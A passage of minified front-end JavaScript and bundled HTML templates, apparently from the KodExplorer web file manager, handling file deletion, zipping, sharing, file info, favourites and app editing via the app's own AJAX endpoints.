                if ("share" == e[0].type && (o = LNG.share_remove, s = LNG.share_remove_tips, r = G.appHost + "userShare/del"), i && (s = LNG.remove_info_force, o = LNG.remove_title_force, r += "&shiftDelete=1"), ("recycle-clear" == e[0].type || G.USER_RECYCLE && G.thisPath == G.USER_RECYCLE || G.thisPath == core.pathFather(G.myhome) + "recycle_kod/") && (s = LNG.recycle_clear_info, r = G.appHost + "explorer/pathDeleteRecycle", o = LNG.recycle_clear, "recycle-clear" == e[0].type && (l = "postEmpty=1")), e[0] && e[0].path) {
                    var c = "<b>" + htmlEncode(core.pathThis(e[0].path)) + "</b>";
                    s = e.length > 1 ? c + ' ... <span class="label label-warning">' + e.length + LNG.remove_item + "</span><br/>" + s : c + "<br/>" + s
                }
                var d = function() {
                    $.ajax({
                        url: r,
                        type: "POST",
                        dataType: "json",
                        data: l,
                        beforeSend: function() {
                            Tips.loading()
                        },
                        error: core.ajaxError,
                        success: function(a) {
                            if (Tips.close(a), ShareData.frameTop("", function(e) {
                                    e.ui.f5()
                                }), "share" == e[0].type) {
                                G.selfShare = a.info;
                                var i = $.dialog.list["share-dialog"];
                                void 0 != i && i.close()
                            }
                            o == LNG.recycle_clear ? core.playSound("recycle_clear") : core.playSound("file_remove"), "function" == typeof t && t(a)
                        }
                    })
                };
                a ? d() : $.dialog({
                    id: "dialog-path-remove",
                    fixed: !0,
                    icon: "question",
                    title: o,
                    padding: "40px 40px",
                    lock: !0,
                    background: "#000",
                    opacity: .1,
                    content: "<div style='width:200px' class='can-select'>" + s + "</div>",
                    ok: d,
                    cancel: !0
                })
            }
        },
        c = function(e) {
            if (core.authCheck("explorer.fileDownload", !0) && !(1 > e.length)) {
                var t = G.appHost + "explorer/zipDownload";
                G.sharePage !== void 0 && (t = G.appHost + "share/zipDownload&user=" + G.user + "&sid=" + G.sid), $.ajax({
                    url: t,
                    type: "POST",
                    dataType: "json",
                    data: n(e),
                    beforeSend: function() {
                        Tips.loading(LNG.zip_download_ready)
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        Tips.close(e), Tips.tips(e);
                        var t = G.appHost + "explorer/fileDownloadRemove&path=" + urlEncode(e.info);
                        t += "&accessToken=" + G.accessToken, G.sharePage !== void 0 && (t = G.appHost + "share/fileDownloadRemove&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode(e.info)), $.dialog({
                            icon: "succeed",
                            title: !1,
                            time: 2,
                            content: LNG.download_ready + "..."
                        }), $('<iframe src="' + t + '" style="display:none;width:0px;height:0px;"></iframe>').appendTo("body")
                    }
                })
            }
        },
        d = function(e, t, a) {
            1 > e.length || (a || (a = "zip"), $.ajax({
                url: G.appHost + "explorer/zip&fileType=" + a,
                type: "POST",
                dataType: "json",
                data: n(e),
                beforeSend: function() {
                    Tips.loading(LNG.ziping)
                },
                error: core.ajaxError,
                success: function(e) {
                    Tips.close(e), e.code && core.playSound("drag_drop"), "function" == typeof t && t(e.info)
                }
            }))
        },
        p = function(e, t, a) {
            if (e) {
                var i = function(e) {
                        $.ajax({
                            url: e,
                            beforeSend: function() {
                                Tips.loading(LNG.unziping)
                            },
                            error: core.ajaxError,
                            success: function(e) {
                                Tips.close(e), "function" == typeof t && t(e)
                            }
                        })
                    },
                    n = G.appHost + "explorer/unzip&path=" + urlEncode(e);
                "toThis" == a && (n += "&toThis=1"), "toFolder" == a ? core.api.pathSelect({
                    type: "folder",
                    title: LNG.unzip_to
                }, function(e) {
                    n += "&pathTo=" + e, i(n)
                }) : i(n)
            }
        },
        f = function(e) {
            var t = e.path,
                a = core.pathPre(t);
            if (a == G.KOD_GROUP_PATH || a == G.KOD_GROUP_SHARE || a == G.KOD_USER_SHARE) return Tips.tips(LNG.path_can_not_share, "warning"), void 0;
            var i = "folder" == e.type ? "folder" : "file";
            1 > t.length || core.authCheck("userShare.set", !0) && $.ajax({
                url: G.appHost + "userShare/checkByPath&path=" + urlEncode(t),
                dataType: "json",
                error: core.ajaxError,
                success: function(e) {
                    if (e.code) u(e.data);
                    else {
                        G.selfShare = e.info;
                        var a = {
                            path: t,
                            type: i,
                            name: core.pathThis(t)
                        };
                        h(a, function(e) {
                            e.code ? (G.selfShare = e.info, ui.f5(), u(e.data)) : (Tips.tips(e), u(void 0, function() {
                                $(".content-info input[name=type]").val(i), $(".content-info input[name=path]").val(t), $(".content-info input[name=name]").val(core.pathThis(t) + "(1)"), "file" == i && ($(".label-code-read").addClass("hidden"), $(".label-can-upload").addClass("hidden"))
                            }))
                        })
                    }
                }
            })
        },
        u = function(t, a) {
            0 != $(".share-dialog").length && $(".share-dialog").shake(3, 30, 100), e.async(["lib/jquery.datetimepicker/jquery.datetimepicker.css", "lib/jquery.datetimepicker/jquery.datetimepicker.js"], function() {
                m(t), void 0 != a && a()
            })
        },
        h = function(e, t) {
            $.ajax({
                url: G.appHost + "userShare/set",
                data: e,
                type: "POST",
                dataType: "json",
                beforeSend: function() {
                    $(".share-create-button").addClass("disabled")
                },
                error: function() {
                    Tips.tips(LNG.error, !1)
                },
                success: function(e) {
                    $(".share-create-button").removeClass("disabled"), void 0 != t && t(e)
                }
            })
        },
        m = function(t) {
            var a = e("./tpl/share.html"),
                i = template.compile(a),
                n = i({
                    LNG: LNG
                });
            $.dialog({
                id: "share-dialog",
                simple: !0,
                resize: !1,
                width: 425,
                title: LNG.share,
                padding: "0",
                fixed: !0,
                content: n
            });
            var o = "zh-CN" == G.lang ? "ch" : "en";
            $("#share-time").datetimepicker({
                format: "Y/m/d",
                formatDate: "Y/m/d",
                timepicker: !1,
                lang: o
            }), $("#share-time").unbind("blur").bind("blur", function(e) {
                stopPP(e)
            });
            var s = function(e) {
                    if ($(".share-setting-more").addClass("hidden"), void 0 == e) $(".share-has-url").addClass("hidden"), $(".share-action .share-remove-button").addClass("hidden"), $(".content-info input[name=sid]").val(""), $(".content-info input[name=type]").val(""), $(".content-info input[name=name]").val(""), $(".content-info input[name=showName]").val(""), $(".content-info input[name=path]").val(""), $(".content-info input[name=timeTo]").val(""), $(".content-info input[name=sharePassword]").val(""), $(".share-view-info").addClass("hidden");
                    else {
                        e.canUpload === void 0 && (e.canUpload = ""), t = e, e.showName || (e.showName = e.name), $(".content-info input[name=sid]").val(e.sid), $(".content-info input[name=type]").val(e.type), $(".content-info input[name=name]").val(e.name), $(".content-info input[name=showName]").val(e.showName), $(".content-info input[name=path]").val(e.path), $(".content-info input[name=timeTo]").val(e.timeTo), $(".content-info input[name=sharePassword]").val(e.sharePassword), $(".share-view-info").removeClass("hidden"), e.numDownload === void 0 && (e.numDownload = 0), e.numView === void 0 && (e.numView = 0);
                        var a = LNG.share_view_num + e.numView + "  " + LNG.share_download_num + e.numDownload;
                        $(".share-view-info").html(a), "1" == e.codeRead ? $(".content-info input[name=codeRead]").attr("checked", "checked") : $(".content-info input[name=codeRead]").removeAttr("checked"), "1" == e.notDownload ? $(".content-info input[name=notDownload]").attr("checked", "checked") : $(".content-info input[name=notDownload]").removeAttr("checked"), "1" == e.canUpload ? $(".content-info input[name=canUpload]").attr("checked", "checked") : $(".content-info input[name=canUpload]").removeAttr("checked"), $(".share-has-url").removeClass("hidden"), "file" == e.type ? ($(".label-code-read").addClass("hidden"), $(".label-can-upload").addClass("hidden")) : ($(".label-code-read").removeClass("hidden"), $(".label-can-upload").removeClass("hidden"));
                        var i = e.type;
                        "folder" == e.type && (i = 1 == e.codeRead ? "codeRead" : "folder");
                        var n = G.appHost + "share/" + i + "&user=" + G.userID + "&sid=" + e.sid;
                        $(".content-info .share-url").val(n), (e.timeTo || e.sharePassword || e.canUpload || e.codeRead || e.notDownload) && $(".share-setting-more").removeClass("hidden"), $(".share-remove-button").removeClass("hidden"), $(".share-create-button").text(LNG.share_save)
                    }
                },
                r = function() {
                    $(".share-action .share-remove-button").unbind("click").click(function() {
                        l([{
                            type: "share",
                            path: t.sid
                        }], function() {
                            ui.f5()
                        })
                    }), $(".content-info .share-more").unbind("click").click(function() {
                        $(".share-setting-more").toggleClass("hidden")
                    }), $(".share-action .share-create-button").unbind("click").click(function() {
                        var e = "";
                        $(".share-dialog .content-info input[name]").each(function() {
                            var t = urlEncode($(this).val());
                            "checkbox" == $(this).attr("type") && (t = $(this).attr("checked") ? "1" : ""), e += "&" + $(this).attr("name") + "=" + t
                        }), h(e, function(e) {
                            e.code ? (Tips.tips(LNG.success, !0), G.selfShare = e.info, ui.f5(), s(e.data), $(".share-create-button").text(LNG.share_save)) : Tips.tips(e)
                        })
                    }), $(".content-info .open-window").unbind("click").bind("click", function() {
                        window.open($("input.share-url").val())
                    }), $(".content-info .qrcode").unbind("click").bind("click", function() {
                        core.qrcode($("input.share-url").val())
                    });
                    var e = $("input.share-url"),
                        a = e.get(0);
                    e.unbind("hover click").bind("hover click", function() {
                        $(this).focus();
                        var t = e.val().length;
                        if ($.browser.msie) {
                            var i = a.createTextRange();
                            i.moveEnd("character", -a.value.length), i.moveEnd("character", t), i.moveStart("character", 0), i.select()
                        } else a.setSelectionRange(0, t)
                    })
                };
            s(t), r()
        },
        v = function(e) {
            $.ajax({
                url: G.appHost + "setting/set&k=wall&v=" + urlEncode(e),
                dataType: "json",
                success: function(e) {
                    Tips.tips(e)
                }
            })
        },
        g = function(e, t, a, i, n) {
            if (!(1 > e.length)) {
                var o, s = G.myDesktop;
                i && (s = core.pathFather(e)), o = "folder" == a ? "ui.path.list(hashDecode('" + hashEncode(e) + "'));" : "ui.path.open(hashDecode('" + hashEncode(e) + "'));";
                var r = urlEncode(s + t + ".oexe"),
                    l = core.getPathIcon(e);
                "" == l.icon && (l.icon = a), $.ajax({
                    url: G.appHost + "explorer/mkfile&path=" + r,
                    type: "POST",
                    dataType: "json",
                    data: {
                        content: jsonEncode({
                            type: "app_link",
                            content: o,
                            icon: l.icon
                        })
                    },
                    success: function(e) {
                        Tips.tips(e), e.code && (ShareData.frameTop("", function(e) {
                            e.ui.f5()
                        }), "function" == typeof n && n(e.info))
                    }
                })
            }
        },
        b = function(e, t) {
            if (!(1 > e.length)) {
                var a = core.pathThis(e),
                    i = core.pathFather(e);
                jsrun = "core.explorerCode('" + urlEncode(e) + "');";
                var n = urlEncode(i + a + "_project.oexe");
                $.ajax({
                    url: G.appHost + "explorer/mkfile&path=" + n,
                    type: "POST",
                    dataType: "json",
                    data: 'content={"type":"app_link","content":"' + jsrun + '","icon":"folder.png"}',
                    success: function(e) {
                        e.code && "function" == typeof t && t(e.info)
                    }
                })
            }
        },
        y = function(e, t, a) {
            if (e) {
                var i = G.appHost + "explorer/imageRotate&rotate=" + t + "&path=" + urlEncode(e);
                $.ajax({
                    url: i,
                    beforeSend: function() {
                        Tips.loading(LNG.loading)
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        return e ? (Tips.close(e), e.code && "function" == typeof a && a(e), void 0) : (Tips.close(LNG.php_env_error_gd, !1), void 0)
                    }
                })
            }
        },
        k = function(t) {
            var a = {};
            a.fileInfo = e("./tpl/fileinfo/fileInfo.html"), a.pathInfo = e("./tpl/fileinfo/pathInfo.html"), a.pathInfoMore = e("./tpl/fileinfo/pathInfoMore.html"), 1 > t.length && (t = [{
                path: G.thisPath,
                type: "folder"
            }]);
            var i = "info";
            1 == t.length && (i = "file" == t[0].type ? core.pathExt(t[0].path) : "folder"), Tips.loading(LNG.getting), core.fileInfo(n(t), function(e) {
                if (!e.code) return Tips.close(e), void 0;
                Tips.close(LNG.get_success, !0);
                var n = "pathInfoMore",
                    o = LNG.info;
                1 == t.length && (n = "folder" == t[0].type ? "pathInfo" : "fileInfo", o = core.pathThis(t[0].path), o.length > 15 && (o = o.substr(0, 15) + "...  " + LNG.info));
                var s = template.compile(a[n]),
                    r = UUID();
                e.data.is_root = G.isRoot, e.data.LNG = LNG, e.data.atime = date(LNG.time_type_info, e.data.atime), e.data.ctime = date(LNG.time_type_info, e.data.ctime), e.data.mtime = date(LNG.time_type_info, e.data.mtime), e.data.sizeFriendly = pathTools.fileSize(e.data.size);
                var l = $.dialog({
                        id: r,
                        padding: 5,
                        ico: core.iconSmall(i),
                        fixed: !0,
                        title: o,
                        content: s(e.data),
                        ok: !0
                    }),
                    c = 15 * $(".aui-outer .pathinfo").length;
                l.DOM.wrap.css({
                    left: "+=" + c + "px",
                    top: "+=" + c + "px"
                }), x(r, t)
            })
        },
        x = function(e, t) {
            var a = $("." + e);
            a.find(".open-window").bind("click", function() {
                window.open(a.find("input.download-url").val())
            }), a.find(".qrcode").unbind("click").bind("click", function() {
                core.qrcode(a.find("input.download-url").val(), a.find(".qrcode").get(0))
            });
            var i = a.find(".file-md5-loading");
            if (1 == i.length) {
                var o = n(t);
                o += "&getMd5=1", core.fileInfo(o, function(e) {
                    i.removeClass("file-md5-loading"), e.code ? i.html(e.data.fileMd5) : i.html(LNG.error)
                })
            }
            var s = a.find("input.download-url"),
                r = s.get(0);
            s.unbind("hover click").bind("hover click", function() {
                $(this).focus();
                var e = s.val().length;
                if ($.browser.msie) {
                    var t = r.createTextRange();
                    t.moveEnd("character", -r.value.length), t.moveEnd("character", e), t.moveStart("character", 0), t.select()
                } else r.setSelectionRange(0, e)
            }), a.find(".edit-chmod").click(function() {
                var e = $(this).parent().find("input"),
                    a = $(this);
                $.ajax({
                    url: G.appHost + "explorer/pathChmod&mod=" + e.val(),
                    type: "POST",
                    data: n(t),
                    beforeSend: function() {
                        a.text(LNG.loading)
                    },
                    error: function() {
                        a.text(LNG.button_save)
                    },
                    success: function(e) {
                        a.text(e.data).animate({
                            opacity: .6
                        }, 400, 0).delay(1e3).animate({
                            opacity: 1
                        }, 200, 0, function() {
                            a.text(LNG.button_save)
                        }), e.code && ui.f5()
                    }
                })
            })
        },
        w = function(e, t, a) {
            var i = function() {
                $.ajax({
                    url: G.appHost + "fav/del&name=" + urlEncode(e),
                    dataType: "json",
                    async: !1,
                    success: function(e) {
                        "function" == typeof t && t(e)
                    }
                })
            };
            return a ? (i(), void 0) : ($.dialog({
                id: "dialog-fav-remove",
                fixed: !0,
                icon: "question",
                title: LNG.fav_remove,
                width: 200,
                padding: "40px 20px",
                content: LNG.fav_remove + "?",
                ok: i,
                cancel: !0
            }), void 0)
        },
        N = function(e) {
            if (e) {
                if (-1 == trim(core.pathClear(e.path), "/").indexOf("/")) {
                    var t = core.getPathIcon(e.path, e.name);
                    "" != t.icon && (e.ext = t.icon, e.name = t.name)
                }
                "/" == e.path && (e.name = "Home"), $.ajax({
                    url: G.appHost + "fav/add",
                    dataType: "json",
                    data: e,
                    success: function(e) {
                        Tips.tips(e), e.code && !core.isApp("desktop") && ui.tree.refreshFav()
                    }
                })
            }
        },
        L = function(e) {
            var t = {};
            return t.type = e.find("input[type=radio]:checked").val(), t.content = e.find("textarea").val(), t.group = e.find("[name=group]").val(), e.find("input[type=text]").each(function() {
                var e = $(this).attr("name");
                t[e] = $(this).val()
            }), e.find("input[type=checkbox]").each(function() {
                var e = $(this).attr("name");
                t[e] = "checked" == $(this).attr("checked") ? 1 : 0
            }), t
        },
        C = function(e) {
            e.find(".type input").change(function() {
                var t = $(this).attr("apptype");
                e.find("[data-type]").addClass("hidden"), e.find("[data-type=" + t + "]").removeClass("hidden")
            }), e.find(".app-edit-select-icon").unbind("click").bind("click", function() {
                var t = G.basicPath + "static/images/file_icon/icon_app/";
                G.isRoot || (t = ""), core.api.pathSelect({
                    type: "file",
                    title: LNG.path_api_select_file,
                    firstPath: t
                }, function(t) {
                    var t = core.path2url(t);
                    e.find(".app-edit-select-icon-input").val(t)
                })
            }), e.find(".size-full").unbind("click").bind("click", function() {
                var t = $(this).prop("checked");
                t ? (e.find("[name=width]").val("100%"), e.find("[name=height]").val("100%")) : (e.find("[name=width]").val("800"), e.find("[name=height]").val("600"))
            })
        },
        _ = function(t, a, i) {
            var n, o, s, r = LNG.app_create,
                l = UUID(),
                c = e("./tpl/appEdit.html"),
                d = template.compile(c);
            switch (void 0 == i && (i = "userEdit"), "rootEdit" == i && (t = t), "userEdit" == i || "rootEdit" == i ? (r = LNG.app_edit, s = d({
                LNG: LNG,
                uuid: l,
                data: t,
                appType: G.settings.appType
            })) : s = d({
                LNG: LNG,
                uuid: l,
                data: {},
                appType: G.settings.appType
            }), $.dialog({
                fixed: !0,
                width: 450,
                id: l,
                padding: 15,
                title: r,
                content: s,
                button: [{
                    name: LNG.preview,
                    callback: function() {
                        return core.openApp(L(n)), !1
                    }
                }, {
                    name: LNG.button_save,
                    focus: !0,
                    callback: function() {
                        var e = L(n);
                        switch (i) {
                            case "userAdd":
                                var s = urlEncode(G.thisPath + e.name);
                                o = G.appHost + "app/userApp&action=add&path=" + s;
                                break;
                            case "userEdit":
                                o = G.appHost + "app/userApp&path=" + urlEncode(t.path);
                                break;
                            case "rootAdd":
                                o = G.appHost + "app/add&name=" + urlEncode(e.name);
                                break;
                            case "rootEdit":
                                o = G.appHost + "app/edit&name=" + urlEncode(e.name) + "&old_name=" + urlEncode(t.name);
                                break;
                            default:
                        }
                        $.ajax({
                            url: o,
                            type: "POST",
                            dataType: "json",
                            data: {
                                data: urlEncode(jsonEncode(e))
                            },
                            beforeSend: function() {
                                Tips.loading()
                            },
                            error: core.ajaxError,
                            success: function(e) {
                                if (Tips.close(e), e.code)
                                    if ("rootEdit" == i || "rootAdd" == i) {
                                        if (!e.code) return;
                                        ShareData.frameTop("Openapp_store", function(e) {
                                            e.App.reload()
                                        })
                                    } else "function" == typeof a ? a() : ui.f5()
                            }
                        })
                    }
                }]
            }), n = $("." + l), G.isRoot || $(".appbox .appline .right a.open").remove(), t.group && n.find("option").eq(t.group).attr("selected", 1), n.find(".aui-content").css("overflow", "inherit"), i) {
                case "userEdit":
                    n.find(".name").addClass("hidden"), n.find(".desc").addClass("hidden"), n.find(".group").addClass("hidden"), n.find("option[value=" + t.group + "]").attr("checked", !0), "url" != t.type && n.find(".appline[data-type=url]").addClass("hidden");
                    break;
                case "userAdd":
                    n.find(".desc").addClass("hidden"), n.find(".group").addClass("hidden"), n.find("[apptype=url]").attr("checked", !0), n.find("[data-type=url] input[name=resize]").attr("checked", !0), n.find("input[name=width]").attr("value", "800"), n.find("input[name=height]").attr("value", "600"), n.find("input[name=icon]").attr("value", "oexe.png");
                    break;
                case "rootAdd":
                    n.find("[apptype=url]").attr("checked", !0), n.find("[data-type=url] input[name=resize]").attr("checked", !0), n.find("input[name=width]").attr("value", "800"), n.find("input[name=height]").attr("value", "600"), n.find("input[name=icon]").attr("value", "oexe.png");
                    break;
                case "rootEdit":
                    n.find("option[value=" + t.group + "]").attr("selected", !0), "url" != t.type && n.find(".appline[data-type=url]").addClass("hidden");
                    break;
                default:
            }
            C(n)
        },
        T = function() {
            core.appStore()
        },
        S = function(e) {
            e && 4 > e.length && "http" != e.substring(0, 4) || $.ajax({
                url: G.appHost + "app/getUrlTitle&url=" + e,
                dataType: "json",
                beforeSend: function() {
                    Tips.loading()
                },
                success: function(t) {
                    var a = t.data;
                    a = a.replace(/[\/\\]/g, "_"), Tips.close(t);
                    var i = {
                            content: e,
                            type: "url",
                            desc: "",
                            group: "others",
                            icon: "internet.png",
                            name: a,
                            resize: 1,
                            simple: 0,
                            height: "70%",
                            width: "90%"
                        },
                        n = urlEncode(G.thisPath + a);
                    e = G.appHost + "app/userApp&action=add&path=" + n, $.ajax({
                        url: e,
                        type: "POST",
                        dataType: "json",
                        data: {
                            data: urlEncode(jsonEncode(i))
                        },
                        success: function(e) {
                            Tips.close(e), e.code && ui.f5()
                        }
                    })
                }
            })
        };
    return {
        makeJson: n,
        appEdit: _,
        appList: T,
        appAddURL: S,
        share: f,
        shareBox: u,
        setBackground: v,
        createLink: g,
        createProject: b,
        imageRotate: y,
        newFile: o,
        newFolder: s,
        rname: r,
        zipDownload: c,
        zip: d,
        unZip: p,
        info: k,
        remove: l,
        fav: N,
        favRemove: w
    }
}), define("app/path/tpl/fileinfo/fileInfo.html", [], "<div class='pathinfo'>\n	{{if downloadPath}}\n	<div class='p'>\n		<div class='title' style=\"line-height: 30px;\">{{LNG.download_address}}:</div>\n		<div class=\"content input-group\">\n			<input type=\"text\" class=\"download-url\" value='{{downloadPath}}'>\n			<div class=\"input-group-btn\">\n				<button type=\"button\" class=\"btn btn-default open-window\">{{LNG.open}}</button>\n				<button type=\"button\" class=\"btn btn-default qrcode\"><i class=\"icon-qrcode\"></i></button>\n			</div>\n		</div>\n		<div style='clear:both'></div>\n	</div>\n	<div class='line'></div>\n	{{/if}}\n\n	<div class='p'>\n		<div class='title'>{{LNG.address}}:</div>\n		<div class='content' id='id_fileinfo_path'>{{path |kod.window.htmlEncode}}</div>\n		<div style='clear:both'></div>\n	</div>\n	<div class='p'>\n		<div class='title'>{{LNG.size}}:</div>\n		<div class='content'>{{sizeFriendly}}  ({{size.toLocaleString()}} Byte)</div>\n		<div style='clear:both'></div>\n	</div>\n\n	{{if fileMd5}}\n	<div class='p'>\n		<div class='title'>MD5:</div>\n		<div class='content {{if fileMd5 == \"...\"}}file-md5-loading{{/if}}'>{{fileMd5}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if imageSize}}\n	<div class='p'>\n		<div class='title'>{{LNG.image_size}}:</div>\n		<div class='content'>{{imageSize.width}} × {{imageSize.height}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	<div class='line'></div>\n\n	{{if ctime}}\n	<div class='p'>\n		<div class='title'>{{LNG.create_time}}</div>\n		<div class='content'>{{ctime}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if mtime}}\n	<div class='p'>\n		<div class='title'>{{LNG.modify_time}}</div>\n		<div class='content'>{{mtime}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if atime}}\n	<div class='p'>\n		<div class='title'>{{LNG.last_time}}</div>\n		<div class='content'>{{atime}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if owner}}\n	<div class='p'>\n		<div class='title'>{{LNG.file_info_owner}}</div>\n		<div class='content'>{{owner}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if group}}\n	<div class='p'>\n		<div class='title'>{{LNG.file_info_group}}</div>\n		<div class='content'>{{group}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n	\n	{{if mode}}\n		<div class='line'></div>\n		<div class='p change_permission'>\n			<div class='title'>{{LNG.permission}}:</div>\n			<div class='content'>{{mode}}</div>\n			<div style='clear:both'></div>\n		</div>\n		{{if is_root==\"1\"}}\n		<div class='p'>\n			<div class='title'>{{LNG.permission_edit}}:</div>\n			<div class='content'><input type='text' class='info-chmod' value='755'/>\n			<button class='btn btn-default btn-sm edit-chmod' type='button'>{{LNG.button_save}}</button></div>\n			<div style='clear:both'></div>\n		</div>\n		{{/if}}\n	{{/if}}\n</div>\n"), define("app/path/tpl/fileinfo/pathInfo.html", [], "<div class='pathinfo'>\n	<div class='p'>\n		<div class='title'>{{LNG.address}}:</div>\n		<div class='content'>{{path |kod.window.htmlEncode}}</div>\n		<div style='clear:both'></div>\n	</div>\n	<div class='p'>\n		<div class='title'>{{LNG.size}}:</div>\n		<div class='content'>{{sizeFriendly}}  ({{size.toLocaleString()}} Byte)</div>\n		<div style='clear:both'></div>\n	</div>\n	<div class='p'>\n		<div class='title'>{{LNG.contain}}:</div> \n		<div class='content'>{{fileCount}}  {{LNG.file}},{{folderCount}}  {{LNG.folder}}</div>\n		<div style='clear:both'></div>\n	</div>\n	\n	<div class='line'></div>\n	{{if ctime}}\n	<div class='p'>\n		<div class='title'>{{LNG.create_time}}</div>\n		<div class='content'>{{ctime}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if mtime}}\n	<div class='p'>\n		<div class='title'>{{LNG.modify_time}}</div>\n		<div class='content'>{{mtime}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if atime}}\n	<div class='p'>\n		<div class='title'>{{LNG.last_time}}</div>\n		<div class='content'>{{atime}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if owner}}\n	<div class='p'>\n		<div class='title'>{{LNG.file_info_owner}}</div>\n		<div class='content'>{{owner}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if group}}\n	<div class='p'>\n		<div class='title'>{{LNG.file_info_group}}</div>\n		<div class='content'>{{group}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n\n	{{if mode}}\n		<div class='line'></div>\n		<div class='p'>\n			<div class='title'>{{LNG.permission}}:</div>\n			<div class='content'>{{mode}}</div>\n			<div style='clear:both'></div>\n		</div>\n		{{if is_root==\"1\"}}\n		<div class='p'>\n			<div class='title'>{{LNG.permission_edit}}:</div>\n			<div class='content'><input type='text' class='info-chmod' value='755'/>\n			<button class='btn btn-default btn-sm edit-chmod' type='button'>{{LNG.button_save}}</button></div>\n			<div style='clear:both'></div>\n		</div>\n		{{/if}}\n	{{/if}}\n</div>\n"), define("app/path/tpl/share.html", [], '<div class=\'content-box\'>\n	<div class=\'title\'>\n		<div class="titleinfo">{{LNG.share_title}}</div>\n		<div class="share-view-info"></div>\n	</div>\n	<div class=\'content-info\'>\n		<div class="input-line">\n			<span class="input-title">{{LNG.share_path}}:</span>\n			<input class="share-name" type="text" name="path" value="" />\n			<div style="clear:both"></div>\n		</div>\n		<div class="input-line">\n			<span class="input-title">{{LNG.share_name}}:</span>\n			<input type="hidden" name="sid"/>\n			<input type="hidden" name="type"/>\n			<input type="hidden" name="name"/>\n			<input class="share-name" type="text" placeholder="{{LNG.share_name}}" name="showName"/>\n			<a href="javascript:void(0);" class="share-more">{{LNG.more}}<b class="caret"></b></a>\n			<div style="clear:both"></div>\n		</div>\n\n		<div class="share-setting-more hidden">\n			<div class="input-line">\n				<span class="input-title">{{LNG.share_time}}:</span>\n				<input id="share-time" type="text" placeholder="{{LNG.share_time}}" name="timeTo"/>\n				<i class="desc">{{LNG.share_time_desc}}</i>\n				<div style="clear:both"></div>\n			</div>\n			<div class="input-line">\n				<span class="input-title">{{LNG.share_password}}:</span>\n				<input type="text" placeholder="{{LNG.share_password}}" name="sharePassword"/>\n				<i class="desc">{{LNG.share_password_desc}}</i>\n				<div style="clear:both"></div>\n			</div>\n			<div class="input-line share-others">\n				<span class="input-title">{{LNG.others}}:</span>\n				<label class="label-code-read">\n					<input type="checkbox" name="codeRead" class="kui-checkbox size-small" value="">\n					<span>{{LNG.share_code_read}}</span>\n				</label>\n				<label>\n					<input type="checkbox" name="notDownload" class="kui-checkbox size-small" value="">\n					<span>{{LNG.share_not_download}}</span>\n				</label>\n				<label class="label-can-upload">\n					<input type="checkbox" name="canUpload" class="kui-checkbox size-small" value="">\n					<span>{{LNG.share_can_upload}}</span>\n				</label>\n\n				<div style="clear:both"></div>\n			</div>\n		</div>\n\n		<div class="input-line share-has-url clear">\n			<span class="input-title">{{LNG.share_url}}:</span>\n			<div class="input-group">\n			  <input type="text" class="share-url" aria-label="Text input with segmented button dropdown">\n			  <div class="input-group-btn">\n				<button type="button" class="btn btn-default open-window">{{LNG.open}}</button>\n				<button type="button" class="btn btn-default qrcode"><i class="icon-qrcode"></i></button>\n			  </div>\n			  <!-- <div class="share_jiathis_box"></div> -->\n			</div>\n			<div style="clear:both"></div>\n		</div>\n	</div>\n	<div class="share-action">\n		<button type="button" class="btn btn-primary share-create-button">{{LNG.share_create}}</button>\n		<a type="button" href="javascript:void(0);" class="share-remove-button">{{LNG.share_cancle}}</a>\n	</div>\n</div>'), define("app/path/tpl/fileinfo/pathInfoMore.html", [], "<div class='pathinfo'>\n	<div class='p' style='line-height:40px;'>\n		<div class='title'>{{LNG.info}}:</div>\n		<div class='content'>\n			{{fileCount}}  {{LNG.file}},{{folderCount}}  {{LNG.folder}}</div>\n		<div style='clear:both'></div>\n	</div>\n	<div class='line'></div>\n	<div class='p'>\n		<div class='title'>{{LNG.size}}:</div>\n		<div class='content'>{{sizeFriendly}} ({{size.toLocaleString()}} Byte)</div>\n		<div style='clear:both'></div>\n	</div>\n	\n	<div class='line'></div>\n	<div class='p'>\n		<div class='title'>{{LNG.permission}}:</div>\n		<div class='content'>{{mode}}</div>\n		<div style='clear:both'></div>\n	</div>\n	{{if is_root==\"1\"}}\n	<div class='p'>\n		<div class='title'>{{LNG.permission_edit}}:</div>\n		<div class='content'><input type='text' class='info-chmod' value='755'/>\n		<button class='btn btn-default btn-sm edit-chmod' type='button'>{{LNG.button_save}}</button></div>\n		<div style='clear:both'></div>\n	</div>\n	{{/if}}\n</div>\n"), define("app/path/tpl/appEdit.html", [], "<div class='appbox'>\n	<div class='appline name'>\n		<div class='left'>{{LNG.name}}</div>\n		<div class='right'><input type='text' name='name' value='{{if data.name}}{{data.name}}{{/if}}'/></div>\n		<div style='clear:both;'></div>\n	</div>\n	<div class='appline desc'>\n		<div class='left'>{{LNG.app_desc}}</div>\n		<div class='right'><input type='text' name='desc' value='{{if data.desc}}{{data.desc}}{{/if}}'/></div>\n		<div style='clear:both;'></div>\n	</div>\n	<div class='appline icon'>\n		<div class='left'>{{LNG.app_icon}}</div>\n		<div class='right'><input type='text' name='icon' class=\"app-edit-select-icon-input\" value='{{if data.icon}}{{data.icon}}{{/if}}'/>\n			<button class='btn btn-default btn-sm open app-edit-select-icon btn-right'>\n				<i class=\"font-icon icon-folder-open\"></i>\n			</button>\n		</div>\n		<div style='clear:both;'></div>\n	</div>\n	<div class='appline group'>\n		<div class='left'>{{LNG.app_group}}</div>\n		<div class='right'>\n		<select name='group'>\n			{{each appType as val index}}\n			<option value ='{{val.type}}'>{{LNG[val.name] || val.name}}</option>\n			{{/each}}\n		<select>\n		</div>\n		<div style='clear:both;'></div>\n	</div>\n	<div 